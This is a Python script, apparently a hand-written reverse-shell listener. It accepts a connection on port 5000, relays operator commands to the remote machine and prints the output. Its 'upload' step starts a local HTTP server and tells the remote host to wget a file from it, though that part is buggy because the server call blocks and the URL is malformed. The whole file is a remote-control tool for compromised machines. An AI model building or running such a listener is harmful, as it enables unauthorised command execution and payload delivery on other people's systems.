import socket
import random
import http.server
import socketserver


def simple_server():

    PORT = 8080
    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)

        httpd.serve_forever()

def main():
    server = '0.0.0.0'
    # port = random.randint(10000, 50000)
    port = 5000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((server, port))
        sock.listen()
        print(sock)
        conn, addr = sock.accept()
        print('Connected by', addr)
        sock.settimeout(0.1)
        conn.settimeout(0.1)

        # connection F
        # send command
        #parse command output / with timeout
        with conn:

            print ("\n\t\t Welcome to home made shell listener ------")


            # conn.sendall('ls\n'.encode('utf-8'))


            # data = conn.recv(2048)
            # data_decoded = data.decode("utf-8")
            # print('data outside while loop: ', data_decoded)

            while True:

                print("-$ ", end = "")
                conn.sendall("pwd\n".encode("utf-8"))
                data = conn.recv(2048)
                data_decoded = data.decode("utf-8")
                print(data_decoded + "$",end = "")


                try:
                    command = input()+ "\n"
                    if command.startswith("upload"):
                        simple_server()
                        host_name = socket.gethostname()
                        host_ip = socket.gethostbyname(host_name)
                        print("IP :", host_ip)
                        url = 'wget %s:8080\words.txt' % host_ip
                        conn.sendall((url + '\n').encode('utf-8'))
                        continue
                    else:
                        conn.sendall(command.encode("utf-8"))

                    try:
                        print("-$ ", end="")
                        data = conn.recv(2048)
                        data_decoded = data.decode("utf-8")
                        print(data_decoded)

                    except socket.timeout:
                        conn.sendall('pwd\n'.encode('utf-8'))
                        data = conn.recv(2048)
                        data_decoded = data.decode("utf-8")
                        print(data_decoded)
                        continue

                    # data = conn.recv(2048)
                    # data_decoded = data.decode("utf-8")
                    # print(data_decoded)

                except KeyboardInterrupt:
                    print ("goodbye")
                    sock.close()

if __name__ == '__main__':



    main()